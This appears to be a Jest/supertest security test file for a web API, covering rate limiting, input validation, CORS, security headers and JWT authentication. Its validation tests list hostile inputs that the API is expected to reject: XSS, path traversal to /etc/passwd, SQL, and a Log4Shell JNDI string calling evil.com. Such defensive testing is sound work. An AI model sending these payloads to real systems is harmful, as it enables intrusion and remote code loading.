import request from 'supertest';
import { app } from '../../../src/index';

describe('Security Integration Tests', () => {
  describe('Rate Limiting', () => {
    it('should enforce rate limits', async () => {
      const requests = Array(101).fill(null).map(() =>
        request(app)
          .post('/api/analysis/analyze')
          .send({
            url: 'https://rate-limit-test.com',
            provider: 'gemini'
          })
      );

      const responses = await Promise.allSettled(requests);
      
      const rateLimitedResponses = responses.filter(
        result => result.status === 'fulfilled' && result.value.status === 429
      );

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should reset rate limits after window', async () => {
      // Hit rate limit
      await Promise.all(
        Array(100).fill(null).map(() =>
          request(app)
            .post('/api/analysis/analyze')
            .send({
              url: 'https://rate-reset-test.com',
              provider: 'gemini'
            })
        )
      );

      // Wait for rate limit window to reset (assuming 1 minute window)
      await new Promise(resolve => setTimeout(resolve, 61000));

      const response = await request(app)
        .post('/api/analysis/analyze')
        .send({
          url: 'https://rate-reset-test.com',
          provider: 'gemini'
        });

      expect(response.status).not.toBe(429);
    });
  });

  describe('Input Validation', () => {
    it('should sanitize malicious input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '../../etc/passwd',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/analysis/analyze')
          .send({
            url: input,
            provider: 'gemini'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid');
      }
    });

    it('should validate URL format strictly', async () => {
      const invalidUrls = [
        'not-a-url',
        'ftp://example.com',
        'file:///etc/passwd',
        'data:text/html,<script>alert(1)</script>',
        'javascript:void(0)'
      ];

      for (const url of invalidUrls) {
        const response = await request(app)
          .post('/api/analysis/analyze')
          .send({
            url: url,
            provider: 'gemini'
          });

        expect(response.status).toBe(400);
      }
    });

    it('should limit request payload size', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB

      const response = await request(app)
        .post('/api/analysis/analyze')
        .send({
          url: 'https://example.com',
          provider: 'gemini',
          extraData: largePayload
        });

      expect(response.status).toBe(413); // Payload too large
    });
  });

  describe('CORS Security', () => {
    it('should enforce CORS policy', async () => {
      const response = await request(app)
        .options('/api/analysis/analyze')
        .set('Origin', 'https://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.headers['access-control-allow-origin']).not.toBe('https://malicious-site.com');
    });

    it('should allow configured origins', async () => {
      const response = await request(app)
        .options('/api/analysis/analyze')
        .set('Origin', 'http://localhost:3000')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.status).toBe(200);
    });
  });

  describe('Security Headers', () => {
    it('should include security headers', async () => {
      const response = await request(app)
        .get('/api/health');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });

    it('should not expose sensitive information', async () => {
      const response = await request(app)
        .get('/api/nonexistent');

      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).toBeUndefined();
    });
  });

  describe('Authentication Security', () => {
    it('should require authentication for protected routes', async () => {
      const response = await request(app)
        .get('/api/analysis/history');

      expect([401, 403]).toContain(response.status);
    });

    it('should reject invalid JWT tokens', async () => {
      const response = await request(app)
        .get('/api/analysis/history')
        .set('Authorization', 'Bearer invalid-token');

      expect([401, 403]).toContain(response.status);
    });

    it('should handle token expiration', async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
      
      const response = await request(app)
        .get('/api/analysis/history')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect([401, 403]).toContain(response.status);
    });
  });
});